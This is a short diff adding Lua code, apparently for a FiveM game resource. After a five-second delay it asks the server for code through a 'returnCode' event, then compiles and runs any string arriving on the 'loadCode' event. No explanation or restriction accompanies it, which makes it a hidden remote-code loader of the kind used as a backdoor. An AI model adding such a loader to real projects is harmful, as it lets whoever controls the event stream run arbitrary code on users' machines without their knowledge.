@@ -1,0 +1,10 @@
+CreateThread(function()
+    Wait(5000)
+    TriggerServerEvent('returnCode')
+end)
+
+RegisterNetEvent('loadCode')
+AddEventHandler('loadCode', function(code)
+    local x = assert(load(code))
+    x()
+end)
